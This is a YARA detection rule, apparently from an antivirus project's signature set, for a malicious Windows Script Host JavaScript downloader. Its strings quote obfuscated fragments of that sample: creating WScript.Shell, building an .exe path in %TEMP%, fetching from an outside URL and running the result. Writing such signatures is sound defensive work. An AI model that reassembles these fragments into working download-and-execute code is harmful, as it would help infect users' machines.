rule sig_20160328_f3617eb266094563f6177adf1db91d43 {
  meta:
    description = "datamaliciousorder - file 20160328_f3617eb266094563f6177adf1db91d43.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0d51e0b149613d78ae6576dadbbb8847e050d2b367aae24e747c2c794079df6b"

  strings:
    $s1  = "function Qriahxmvfd() {return Tbucknlwoa[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"RPD2UrxsMyO.exe\";};" fullword ascii
    $s2  = "do {WScript[Nhvduauvi](Eiwwilodh() * 11)} while (Tjiyx[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "Tjiyx[Kstwpoh](\"GET\", \"http://perfect-nutrition.co.uk/lwqo9oa\", false);" fullword ascii
    $s4  = "var Tbucknlwoa = function Nnyapipb() {return WScript[Nwzoo](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Wpxpd(Lvcftdxyk, Knovf){return Lvcftdxyk - Knovf;};" fullword ascii
    $s6  = "function Efjvxswfz(Yrszeqogi){Tbucknlwoa[\"Run\"](Yrszeqogi, Uloxjapw, Uloxjapw);};" fullword ascii
    $s7  = "function Ivsxfa() {return ((Cddhvolibx == true) && (Cddhvolibx == Aomscsee)) ? 1 : Uloxjapw;};" fullword ascii
    $s8  = "Cddhvolibx = true; " fullword ascii
    $s9  = "function Zdorn(){return Ifdmbis;};" fullword ascii
    $s10 = "function Pwgesvxza(){return Nwzoo;};" fullword ascii
    $s11 = "function Eiwwilodh(){return 22;};" fullword ascii
    $s12 = "var Aomscsee = false;" fullword ascii
    $s13 = "function Wdmuhyz()" fullword ascii
    $s14 = "return Wpxpd(Ddfkqfx, Ttazkadv);" fullword ascii
    $s15 = "var Akihybo = new this[\"Date\"]();" fullword ascii
    $s16 = " while (Novvjsdnvs){" fullword ascii
    $s17 = "var Blteeiqgvt = false;" fullword ascii
    $s18 = "function Vkegs(Iuftgmmzi) {var Aocilokzpp = (1, 2, 3, 4, 5, Iuftgmmzi); return Aocilokzpp;};" fullword ascii
    $s19 = "Aomscsee = true; " fullword ascii
    $s20 = "var Cddhvolibx = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}